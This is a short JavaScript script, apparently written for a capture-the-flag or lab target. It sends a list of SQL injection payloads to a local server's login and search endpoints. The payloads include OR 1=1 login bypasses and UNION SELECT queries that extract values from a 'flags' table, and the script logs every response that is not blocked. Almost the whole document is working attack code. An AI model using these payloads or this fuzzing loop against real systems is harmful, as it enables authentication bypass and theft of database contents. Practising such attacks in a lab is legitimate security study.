const payloads = [
  "admin' OR 1=1--",
  "admin' OR '1'='1",
  "admin'/*",
  "' OR 1=1--",
  "admin' or 'a'='a",
  "admin' || 1=1--",
  "admin' AND 1=0 UNION SELECT 1, 'admin', 'password', 'admin'--",
  "admin' UNION SELECT 1, flag_value FROM flags--",
  "' UNION ALL SELECT 1, flag_value FROM flags--",
  "%' UNION SELECT 1, flag_value FROM flags--",
  "%' UNION/**/SELECT 1, flag_value FROM flags--",
  "%' UNION SELECT char(67)||char(84)||char(70) FROM flags--",
  "%' UNION SELECT 1, flag_value FROM flags WHERE '1'='1",
  "\\",
  "admin\" or 1=1--",
  "%' UNION VALUES (1, (SELECT flag_value FROM flags))--",
  "%' UNION SELECT 1, (SELECT flag_value FROM flags))--",
];

const testPayloads = async () => {
  for (const p of payloads) {
    // Test login bypass
    const res = await fetch('http://localhost:4000/api/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username: p, password: "123" })
    });
    if (res.status !== 403) {
      console.log(`[LOGIN BYPASS FOUND!] Payload: ${p} | Status: ${res.status}`);
      const text = await res.text();
      console.log(`Response: ${text}`);
    }

    // Test search bypass
    const res2 = await fetch(`http://localhost:4000/api/search?q=${encodeURIComponent(p)}`);
    if (res2.status !== 403) {
      console.log(`[SEARCH BYPASS FOUND!] Payload: ${p} | Status: ${res2.status}`);
      const text2 = await res2.text();
      console.log(`Response: ${text2}`);
    }
  }
};

testPayloads();
